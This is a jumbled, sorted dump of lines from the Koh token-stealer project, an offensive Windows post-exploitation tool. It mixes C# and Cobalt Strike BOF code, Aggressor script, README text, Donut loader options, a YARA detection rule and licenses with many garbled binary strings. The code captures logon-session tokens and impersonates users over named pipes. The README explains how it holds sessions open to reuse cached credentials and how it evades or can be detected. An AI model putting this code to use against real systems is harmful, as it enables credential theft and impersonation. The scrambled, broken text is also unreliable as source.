+"        $s1 = ""["
+"        $s2 = ""S-1-[0-59]-"
+"        $s3 = ""0x[0-9A-Fa-f]"
+"        $s4 = """
+"        $x_typelibguid = ""4d5350c8-7f8c-47cf-8cde-c752018af17e"" ascii"
+"        /// <param name=""buffer"">Data</param>"
+"        /// <param name=""bufferSize"">Size of the buffer to allocate</param>"
+"        /// <param name=""size"">Size of the buffer to allocate</param>"
+"        BeaconPrintf(CALLBACK_ERROR, ""[!] Writing to named pipe %s using KERNEL32$WriteFile failed with: %d"
+"        BeaconPrintf(CALLBACK_OUTPUT, ""%s"", lpPipeContent)"
+"        BeaconPrintf(CALLBACK_OUTPUT, ""["
+"        MSVCRT$sprintf(kohCommand, ""%s exit"", kohPassword)"
+"        MSVCRT$sprintf(kohCommand, ""%s filter add %s"", kohPassword, filterSID)"
+"        MSVCRT$sprintf(kohCommand, ""%s filter list"", kohPassword)"
+"        MSVCRT$sprintf(kohCommand, ""%s filter remove %s"", kohPassword, filterSID)"
+"        MSVCRT$sprintf(kohCommand, ""%s filter reset"", kohPassword)"
+"        MSVCRT$sprintf(kohCommand, ""%s groups %d"", kohPassword, LUID)"
+"        MSVCRT$sprintf(kohCommand, ""%s impersonate %d %s"", kohPassword, LUID, impersonationPipe)"
+"        MSVCRT$sprintf(kohCommand, ""%s list %d"", kohPassword, LUID)"
+"        MSVCRT$sprintf(kohCommand, ""%s list"", kohPassword)"
+"        MSVCRT$sprintf(kohCommand, ""%s release %d"", kohPassword, LUID)"
+"        MSVCRT$sprintf(kohCommand, ""%s release all"", kohPassword)"
+"        [DllImport(""Secur32.dll"", SetLastError = false)]"
+"        [DllImport(""Secur32.dll"", SetLastError = true)]"
+"        [DllImport(""advapi32"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""advapi32.dll"")]"
+"        [DllImport(""advapi32.dll"", SetLastError = true)]"
+"        [DllImport(""kernel32"", EntryPoint = ""GetComputerNameA"", CharSet = CharSet.Ansi, SetLastError = true)]"
+"        [DllImport(""kernel32.dll"")]"
+"        [DllImport(""kernel32.dll"", SetLastError = true)]"
+"        [DllImport(""secur32.dll"", CharSet = CharSet.Auto)]"
+"        [DllImport(""secur32.dll"", SetLastError = false)]"
+"        [DllImport(""secur32.dll"", SetLastError = true)]"
+"        author = ""Will Schroeder (@harmj0y)"""
+"        beacon_inline_execute($bid, $bofData, ""go"", $bofArgs)"
+"        berror($1, ""Invalid usage!"")"
+"        berror($bid, ""KohClient BOF not found!"")"
+"        description = ""The TypeLibGUID present in a .NET binary maps directly to the ProjectGuid found in the '.csproj' file of a .NET project."""
+"        else if($3 iswm ""add"") {"
+"        else if($3 iswm ""remove"") {"
+"        else if($3 iswm ""reset"") {"
+"        fSuccess = KERNEL32$ReadFile(clientPipe, lpPipeContent, BUFSIZE, "
+"        fSuccess = KERNEL32$ReadFile(serverPipe, "
+"        if (!KERNEL32$ConnectNamedPipe(serverPipe, NULL)) {"
+"        if($3 iswm ""all"") {"
+"        if($3 iswm ""list"") {"
+"        if(NTDLL$RtlAdjustPrivilege(29, TRUE, FALSE, "
+"        private ConcurrentDictionary<string, Capture.CapturedSession> _capturedSessions"
+"        private ConcurrentDictionary<string, bool> _excludeSids"
+"        private ConcurrentDictionary<string, bool> _filterSids"
+"        private ConcurrentDictionary<string, int> _meta"
+"        private const string Version = ""1.0.0"""
+"        public PipeServer(string pipeName, string password, ConcurrentDictionary<string, int> meta, ConcurrentDictionary<string, Capture.CapturedSession> capturedSessions, ConcurrentDictionary<string, bool> excludeSids, ConcurrentDictionary<string, bool> filterSids, string mode, bool debug = false)"
+"        public static Dictionary<string, FoundSession> LogonSessions(bool DEBUG = false)"
+"        public static IntPtr GetTokenInfo(IntPtr token, Interop.TOKEN_INFORMATION_CLASS informationClass)"
+"        public static IntPtr NegotiateToken(LUID luid, ConcurrentDictionary<string, int> meta, bool DEBUG = false)"
+"        public static Interop.SECURITY_HANDLE GetCredentialHandle(LUID luid, ConcurrentDictionary<string, int> meta = null)"
+"        public static bool CheckTokenForGroup(IntPtr token, string groupSID)"
+"        public static bool operator !=(LUID x, LUID y)"
+"        public static bool operator ==(LUID x, LUID y)"
+"        public static extern bool GetComputerName(StringBuilder lpBuffer, ref int nSize)"
+"        public static string GetCredentialUserName(LUID luid, bool DEBUG = false)"
+"        public static void Sessions(ConcurrentDictionary<string, int> meta, ConcurrentDictionary<string, CapturedSession> capturedSessions, ConcurrentDictionary<string, bool> excludeSids, ConcurrentDictionary<string, bool> filterSids, bool loop = true, bool captureSessions = true, bool DEBUG = false)"
+"        reference = ""https://github.com/GhostPack/Koh"""
+"        serverPipe = KERNEL32$CreateNamedPipeA(impersonationPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, "
+"       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86"
+"       -b <level>           Bypass AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail.(default)"
+"       -d <name>            AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly."
+"       -e <level>           Entropy. 1=None, 2=Use random names, 3=Random names "
+"       -f <format>          Output format. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=Powershell, 7=C"
+"       -n <name>            Module name for HTTP staging. If entropy is enabled, this is generated randomly."
+"       -o <path>            Output file to save loader. Default is ""loader.bin"""
+"       -x <action>          Exiting. 1=Exit thread (default), 2=Exit process"
+"       -z <engine>          Pack/Compress file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman"
+"    $BOFPath = script_resource(""KohClient."" . $barch . "".o"")"
+"    <Compile Include=""Capture.cs"" />"
+"    <Compile Include=""Creds.cs"" />"
+"    <Compile Include=""Find.cs"" />"
+"    <Compile Include=""Helpers.cs"" />"
+"    <Compile Include=""Interop.cs"" />"
+"    <Compile Include=""LUID.cs"" />"
+"    <Compile Include=""Pipe.cs"" />"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Compile Include=""SecBuffer.cs"" />"
+"    <Compile Include=""SecBufferDesc.cs"" />"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""app.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    BeaconPrintf(CALLBACK_OUTPUT, ""["
+"    char impersonationPipe[] = """
+"    char kohPassword[] = ""password"""
+"    char kohPipe[] = """
+"    clientPipe = KERNEL32$CreateFileA(kohPipe, GENERIC_READ "
+"    donut loader.dll -c TestClass -m RunProcess -p""calc notepad"" -s http://remote_server.com/modules/"
+"    else if($command iswm ""exit"") {"
+"    else if($command iswm ""filter"") {"
+"    else if($command iswm ""groups"") {"
+"    else if($command iswm ""impersonate"") {"
+"    else if($command iswm ""release"") {"
+"    if(!KERNEL32$WriteFile(clientPipe, kohCommand, MSVCRT$strlen(kohCommand), "
+"    if($command iswm ""list"") {"
+"    lpPipeContent = (PBYTE)KERNEL32$LocalAlloc(LPTR, BUFSIZE)"
+"  2021"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  [ Copyright (c) 2019 TheWover, Odzhan"
+"  [ Module file   : ""%s"""
+"  [ Shellcode     : ""%s"""
+" ""Lh"
+" ""Remote"" client that allows for monitoring through the Koh named pipe remotely"
+" (_mode == ""capture""))"
+" (_mode == ""monitor""))"
+" (meta[""AcquireCredentialsHandleError""] > 0))"
+" (meta[""SignalExit""] != 1))"
+" (parts[2] == ""add"") "
+" (parts[2] == ""list""))"
+" (parts[2] == ""remove"") "
+" (parts[2] == ""reset""))"
+" 0x40000000, 0, 0, 3, 0, 0)"
+" GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)"
+" Handle ""Protected Users""/TokenLeakDetectDelaySecs situations better"
+" However, and existing ticket/credential extraction can still be done on the leaked logon session."
+" If the Koh.exe assembly is run _inline_ (via [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) or [Inject-Assembly](https://github.com/kyleavery/inject-assembly)) for a Cobalt Strike Beacon that's running in a SYSTEM context, everything works properly."
+" If the Koh.exe assembly is run _inline_ (via [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) or [Inject-Assembly](https://github.com/kyleavery/inject-assembly)) for a Cobalt Strike Beacon that's running in an elevated, but not SYSTEM, context, the call to AcquireCredentialsHandle() fails with "
+" Implement more clients (PowerShell, C"
+" IntPtr.Size), typeof(Interop.SID_AND_ATTRIBUTES))"
+" LOSS OF USE, DATA, OR PROFITS"
+" Redistributions in binary form must reproduce the above copyright notice,"
+" Redistributions of source code must retain the above copyright notice, this"
+" Reuses legitimate captured auth on a system, so should ""blend with the noise"" reasonably well."
+" Spinning off everything to a separate thread, specifying a STA thread apartment."
+" Stability in production environments, specifically intentional token leakage causing issues on highly-trafficked servers"
+" This requires opening up lots of processes/handles, which looks very suspicious."
+" Unfortunately, you need "
+" WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)"
+" When the Koh.exe assembly is run from an elevated (but non-SYSTEM) context, everything works properly."
+" [Donut-built](https://github.com/TheWover/donut) PIC will be output to the main directory. The Donut blob is both x86/x64 compatible, and is built with the following options using v0.9.3 of Donut at "
+" approach described below, which is what we went with."
+" arg, int a_len)"
+" args, unsigned long alen) {"
+" as detailed in the Koh.yar Yara rule in this repo. If this is not changed on compilation, it should be a very high fidelity indicator of the Koh server."
+" buffer, int length)"
+" buffer, int size)"
+" data, int len)"
+" dst, int max)"
+" fmt, ...)"
+" format, char "
+" format, int "
+" format, int maxsz)"
+" format, int value)"
+" from an elevated (but non-SYSTEM) context, everything works properly."
+" is non-zero, and the user actively logs off of an interactive or remote interactive (RDP) session, the credentials will be cleared. I need to program Koh to better deal with these specific types of situations."
+" logoff event, and on fire will purge anything still tied to it. Off by default. Protected Users always on, with a default of 30s."
+" only works with desktop sessions, and there's no userland API that we could find that lets you map a LUID to a usable token."
+" pInfo, char "
+" parser, char "
+" parser, int "
+" payload, int p_len, int p_offset, char "
+" reset]"")"
+" setting, which triggers the ""_...clearing of any credentials of logged off users..._"". By default in fact, members of the [""Protected Users Security Group""](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) have this behavior enforced regardless of the registry setting. However, setting this to a non-zero value will clear ALL credentials out of memory when a user logs off. Specifically, as [Steve mentions:](https://twitter.com/SteveSyfuhs/status/1545822123926597632) "
+" src, wchar_t "
+" text, int len)"
+" type spawn or something similar, there is no logoff event when the process stops and the credential/token can still be captured."
+" which is traditionally only held by LSASS, meaning you need to steal LSASS' token which isn't ideal."
+"!"">}tM>'>"
+"!,X< w"
+"!L""%c}>g8"
+"!L""J"
+"!L""h1"
+"!L5=L}zL!,L"
+"!M,(u"
+"""$(SolutionDir)"
+"""$>S= 5>Va"
+"""3>PkY)>'._M"
+"""Captures"" logon sessions by negotiating usable tokens for each new session."
+"""Interacts with a running Koh server."","
+"""Mt""DE"
+"""Qja"
+"""koh exit              - signals the Koh server to exit"
+"""koh filter add SID    - adds a group SID for capture filtering"
+"""koh filter list       - lists the group SIDs used for capture filtering"
+"""koh filter remove SID - removes a group SID from capture filtering"
+"""koh filter reset      - resets the SID group capture filter"
+"""koh groups LUID       - lists the group SIDs for a captured token"
+"""koh impersonate LUID  - impersonates the captured token with the give LUID"
+"""koh list              - lists captured tokens"
+"""koh release LUID      - releases the captured token for the specified LUID"
+"""koh release all       - releases all captured tokens"
+"""koh"", "
+"""z8$"
+"$ 3Ul$(VW3D$,3t$"
+"$"" wide"
+"$""))"
+"$"":uq"
+"$0D$("""
+"$0N""t"
+")KERNEL32$LocalAlloc(LPTR, MSVCRT$strlen(kohPassword) "
+")f@D$"":"
+", 8=Hex"
+", DWORD, DWORD )"
+", LPCSTR, LPCSTR, DWORD, DWORD )"
+", etc.)"
+", however this is usually easier to get than "
+", so sending "
+",-./0123456789:"
+",/<-w"
+",=>B_"
+",HgfffffffHH"
+",I<%w"
+",dH9"
+",t>t7"
+"- If the credential is present via an RDP session where the user just disconnects instead of logs out, there is no logoff event when the process stops and the credential/token can still be captured."
+"-""RP("
+". The communication named pipe has an ""Everyone"" DACL but uses a basic shared password (super securez)."
+".=k=yICyJ""p"
+".>9Ir,>X>z"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"1. Redistributions of source code must retain the above copyright notice, this"
+"2. Redistributions in binary form must reproduce the above copyright notice,"
+"3. On a new logon session, open up a handle to every reachable process and enumerate all existing handles, cloning the token linked to the new logon session."
+"333D$,"
+"3HtGL3H,EDt$(MH"
+"4,Tw"
+"5>>t""v:>R"
+"7xB"">"
+"8""uQN/"
+"8:>})36,>"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<startup><supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.7.2""/></startup></configuration>"
+"= $""    {sidString}"
+"= $"""
+"=4<,BF>"
+"=lg=)>,"
+">""g/:"
+">[ >["""
+"@,PTL$"
+"@@""@"
+"@@w,=q/"
+"@SH H"""
+"A@""wHHL$ L"
+"AA,A$"
+"AA,c"
+"AHHu,0"
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"After MS16-111, when security tokens are leaked, the logon sessions associated with those security tokens also remain on the system until all associated tokens are closed... even after the user has logged off the system. If the tokens associated with a given logon session are never released, then the system now also has a permanent logon session leak as well."
+"After publishing the [Koh: The Token Stealer](https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6) post, I had a great [exchange](https://twitter.com/harmj0y/status/1545535785029345280) between [@cnotin](https://twitter.com/cnotin) and [@SteveSyfuhs](https://twitter.com/SteveSyfuhs) about what ended up being a partial mitigation for this approach."
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"A}""8g"
+"BT,BL$I"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 1998-2014 Joergen Ibsen, All Rights Reserved."
+"Copyright (c) 2019, TheWover, Odzhan. All rights reserved."
+"Copyright (c) 2022, Will Schroeder"
+"D$,A"
+"D$,D$,"
+"D$,D$,D$(D$ "
+"D$,H$"
+"D$,PE"
+"D$,Pj"
+"D$,Ps"
+"D$,t$"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc (UINT, SIZE_T)"
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptCreateHash( HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH "
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptGetHashParam( HCRYPTHASH, DWORD, PBYTE, PDWORD, DWORD )"
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptHashData( HCRYPTHASH, const BYTE "
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptReleaseContext( HCRYPTPROV, DWORD )"
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptReleaseContext( HCRYPTPROV, DWORD)"
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$InitializeSecurityDescriptor( PSECURITY_DESCRIPTOR, DWORD )"
+"DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$SetSecurityDescriptorDacl( PSECURITY_DESCRIPTOR, BOOL, PACL, BOOL)"
+"DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$DuplicateTokenEx (HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE)"
+"DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$OpenThreadToken (HANDLE, DWORD, BOOL, PHANDLE)"
+"DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GetComputerNameA (LPSTR, LPDWORD)"
+"DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char "
+"DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char "
+"DECLSPEC_IMPORT void   BeaconOutput(int type, char "
+"DECLSPEC_IMPORT void   BeaconPrintf(int type, char "
+"DR you should really be using the ""Protected Users Security Group"" for sensitive users, and see if setting "
+"E,>H"
+"E2Dt$p""H="
+"E33"""
+"Eu""IK"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"Filtering can then be done on the token itself, via [CheckTokenMembership()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership) or [GetTokenInformation()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation). For example, we could release any tokens except for ones belonging to domain admins, or specific groups we want to target."
+"For a deeper explanation of the motivation behind Koh and its approach, see the [Koh: The Token Stealer](https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6) post."
+"For all intents and purposes, the thread context right before the call to AcquireCredentialsHandle works in this context, but the result errors out. "
+"G@D$,Wj"
+"Group SIDs can be supplied command line as well, causing Koh to monitor/capture only logon sessions that contain the specified group SIDs in their negotiated token information."
+"H [H%""F"
+"H""pH$"
+"HDuCA,Gu"
+"HH,H"
+"HH}8"""
+"HH}8Y"""
+"HL$(T$,$p"
+"HL$X"""
+"HM8"""
+"HT$P"""
+"HT$P,"
+"H_ """
+"However, if the user is in the ""Protected Users Security Group"" or "
+"Ht""e"
+"Ht,7<"
+"Hu"".X"
+"Hu""3H"
+"Hx AVH03AHHHu""8Z(t"
+"Hx AVH@3EHHHu""8Z(t"
+"IHD$ """
+"II""J"
+"If Koh starts in an elevated context but not as SYSTEM, a handle/token clone of "
+"If set, it'll start a timer on a sessions "
+"If you have an idea of what this might be, please let us know! And if you want to try playing around with a simpler assembly, check out the [AcquireCredentialsHandle](https://github.com/harmj0y/AcquireCredentialsHandle) repo on my GitHub for troubleshooting."
+"I{,>"
+"K,6HM"
+"KAS,A<Zw"
+"Koh has been built against .NET 4.7.2 and is compatible with Visual Studio 2019 Community Edition. Simply open up the project .sln, choose ""Release"", and build. The "
+"Koh.csproj"", ""{4D5350C8-7F8C-47CF-8CDE-C752018AF17E}"""
+"Koh.pdb"" ascii"
+"L$(DD$,HD$(H"
+"L$8,HH"
+"L3""j"
+"L3H:l"""
+"LEu""A"
+"MHL$PH,9"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"P,=87Msgm"
+"PQR,]$"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""Koh"", ""Koh"
+"QP,F"
+"QSSv,v("
+"Redistribution and use in source and binary forms, with or without"
+"SD, SECURITY_DESCRIPTOR_REVISION)"
+"SD, TRUE, NULL, FALSE)"
+"SYSTEM via LSA policy modification, but this would need a reboot/new logon session to express the new user rights."
+"SYSTEM"""
+"So if we can get a handle to a newly created logon session via a token, we can keep that logon session open and later impersonate that token to utilize any cached credentials it contains."
+"Some code was inspired by [Elad Shamir](https://twitter.com/elad_shamir)'s [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) project (no license), as well as [KB180548](https://mskb.pkisolutions.com/kb/180548). For why this is possible and Koh's approeach, see the [Technical Background]("
+"T$,:"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"The Koh ""server"" captures tokens and uses named pipes for control/communication. This can be wrapped in [Donut](https://github.com/TheWover/donut/) and injected into any "
+"The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),"
+"There are likely some RPC artifacts for the token capture that we're hoping to investigate. We will update this section of the README if we find any additional detection artifacts along these lines. Hooking of some of the possibly-uncommon APIs used by Koh ([LsaEnumerateLogonSessions](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions) or the specific AcquireCredentialsHandle/InitializeSecurityContext/AcceptSecurityContext, specifically using a LUID in [AcquireCredentialsHandle](https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general)) could be explored for effectiveness, but alas, I am not an EDR."
+"There are two important things to note in the above paragraph: ""logoff event"" and ""interactive"". This can result in some situations where a user's credential is NOT cleared:"
+"To compile fresh on Linux using Mingw, see the "
+"To quote [@tifkin_](https://twitter.com/tifkin_) _""Everything is stealthy until someone is looking for it.""_ While Koh's approach is slightly different than others, there are still IOCs that can be used to detect it."
+"U,3Vj PEEEEP"
+"Using this call while specifying a logon session ID/LUID appears to increase the ReferenceCount for the logon session structure, preventing it from being released. However, we're not presented with another problem: given a ""leaked""/held open logon session, how do we get a usable token from it"
+"VWz,3"
+"WH E3ILMu,Hu,Ht"
+"WH0AHHHu""6a"
+"WINBASEAPI BOOL WINAPI KERNEL32$ConnectNamedPipe (HANDLE, LPOVERLAPPED)"
+"WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)"
+"WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)"
+"WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA (LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES)"
+"WINBASEAPI NTSTATUS NTAPI NTDLL$RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)"
+"WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)"
+"WINBASEAPI WINBOOL WINAPI KERNEL32$WriteFile (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)"
+"We are not planning on releasing binaries for Koh, so you will have to compile yourself :)"
+"When a new logon session is estabslished on a system, a new token for the logon session is created by LSASS using the NtCreateToken() API call and returned by the caller of LsaLogonUser(). This [increases the ReferenceCount](https://systemroot.gitee.io/pages/apiexplorer/d0/d9/rmlogon_8c-source.html"
+"Wv,v(vLvHV"
+"X<XF"""
+"Z(k"""
+"[""93u"
+"[@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base. [@tifkin_](https://twitter.com/tifkin_) helped with the approach, BOF implementation, and some token mechanics."
+"[MS16-111](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-111) was applied back to Windows 7/Server 2008, so this approach should be effective for everything except Server 2003 systems."
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""Koh"")]"
+"[assembly: AssemblyTitle(""Koh"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""4d5350c8-7f8c-47cf-8cde-c752018af17e"")]"
+"] Added {parts[3]} group SID to capture filtering."""
+"] Already SYSTEM, not elevating"
+"] Already SYSTEM, not elevating"" wide fullword"
+"] Command: {command}"")"
+"] Credential dt: {dt}"")"
+"] Hit token capture limit of {Program.maxTokens}, not capturing additional tokens"
+"] Impersonating token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} to {pipeName}"""
+"] Koh is exiting..."""
+"] New Logon Session     : {DateTime.Now}"")"
+"] Released all captured tokens except the token for LUID '{parts[3]}'"""
+"] Released all captured tokens"""
+"] Released token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid}"""
+"] Removed {parts[3]} group SID from capture filtering."""
+"] Reset all filtering SIDs"""
+"] Starting server with named pipe: {_pipeName}"")"
+"] Targeting group SIDs:"")"
+"] fileTime: {fileTime}"")"
+"] host called home, sent: 20 bytes"
+"] host called home, sent: 6548 bytes"
+"] host called home, sent: 69 bytes"
+"_,dXv"
+"_,dag"
+"_@SHP3HLHt7DC0HHT$ AQX0u"""
+"_However_ we can use two additional SSPI functions, [InitializeSecurityContext()](https://docs.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--negotiate) and [AcceptSecurityContext()](https://docs.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--negotiate) to act as client and server to ourselves, negotiating a new security context that we can then use with [QuerySecurityContextToken()](https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-querysecuritycontexttoken) to get a usable token. This was documented in KB180548 ([mirrored by PKISolutions here](https://mskb.pkisolutions.com/kb/180548)) for the purposes of credential validation. This is a similar approach to [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue), except we are completing the entire handshake process, producing a token, and then holding that for later use."
+"_Str1,const char "
+"_Str2,size_t _MaxCount)"
+"__format, ...)"
+"__stream, const char "
+"buf   = """""
+"bytesRead, NULL)"
+"commandBytesWritten, 0)) {"
+"d8J,"
+"d8J,BLHH"
+"d8L2WBJa""="
+"dddd, MMMM dd, yyyy"
+"donut.exe"" -p capture -e 3 -z 5 -b 2 -a 3 -o ""$(SolutionDir)$(ProjectName).bin"" $(TargetPath)</PostBuildEvent>"
+"d{2}"" wide"
+"d{2}"""
+"d{8,10}-"
+"d{8,10}-[1-9]"
+"e,Bb"
+"echo ""Build completed!"""
+"echo ""Building Koh BOFs..."""
+"f37>,"
+"imposecost"""
+"imposingcost"""
+"include ""KohClient.h"""
+"include ""beacon.h"""
+"juvD,GA"
+"l00278) field of the logon session kernel structure. When this ReferenceCount reaches 0, the logon session is destroyed. Because of the information described in the [Why This Is Possible]("
+"m""e="
+"message, 1, "
+"modification, are permitted provided that the following conditions are met:"
+"n __  ___   ______    __    __  "")"
+"n"", KERNEL32$GetLastError())"
+"n"", groupSids.Where(x => Helpers.IsDomainSid(x)).ToArray())"
+"n"", impersonationPipe)"
+"n"", impersonationPipe, KERNEL32$GetLastError())"
+"n"", kohPipe)"
+"n"", kohPipe, KERNEL32$GetLastError())"
+"n[X] No sessions captured and error with AcquireCredentialsHandle, exiting..."")"
+"operator """" "
+"parser, NULL)"
+"parser, args, alen)"
+"rD$VHT$VD$p ""D"
+"s""E8"
+"s""EN"
+"s,s(s4s0S"
+"t""HcM"
+"t""LM"
+"t""u4u"
+"t,8Y"
+"t,t!Hc"
+"t0CA,c"
+"t>Ht"""
+"tUCA,c"
+"tv,0"
+"u""8Z(t"
+"u""Al"
+"u""HD$ H"
+"u$Eu,"
+"u,A)"
+"u,HI"
+"u,L8"
+"uME9""u"
+"v""IH"
+"v,LF(H"
+"v,v("
+"v,v(l$4vTvPV"
+"v8k4s8s,s(v"
+"vj""="
+"w.h"""
+"why-this-is-possible) section, Windows systems "
+"wlHcD$,H"
+"xml version=""1.0"" encoding=""utf-8"""
+"{,Ji"
+"{username}"", credentialUserName, logonID, userSID, logonType, authPackage)"
+$ %6
+$ AQ
+$ ATAUAVH 
+$ DA
+$ E333
+$ E3E333:
+$ Et7A
+$ HU
+$ L33LC(HH
+$ Q3PU
+$ S8fO
+$ UHH H
+$ UVWATAUAVAWH
+$ UVWATAUAVAWH$H0
+$ UVWATAUAVAWH0LcL
+$ UVWATAUAVAWHH
+$ VWATAUAVH@E3D!l$xA
+$ WH@H
+$ fA
+$ tyf
+$(3AH
+$(3Ht$0H
+$(A3HD$ SpHT$@HM
+$(ADE
+$(AHD$ E33SpHM
+$(DMH
+$(E3HH
+$(EHD$ 33SpHT$@HM
+$(HD$ 
+$(HT$ I
+$(IH
+$(LE
+$(LH
+$(Lt$0H
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$0AH _HtMtMu
+$0D$(LL$ M
+$0D$(LL$ M97H$
+$0D$(LL$ ML
+$0DC
+$0ED$(
+$0H _
+$0H _@SH H
+$0H _@SH@3HL$ R%
+$0H _@SH@HcHL$ Y$C
+$0H _@SHPHu
+$0H _@UHHPHMHEHELM 
+$0H _H
+$0H _H(-
+$0H _H(Hu
+$0H _HHX
+$0H _HT$
+$0H _Hu
+$0H _LH(
+$0H _j-tH
+$0HD$(
+$0HH
+$0HHt$8H _H
+$0HHt$@Hl$8H _H
+$0HHt$@Hl$8H _HtJH
+$0Hd$(
+$0Hl$8H 
+$0Hl$8Ht$@H
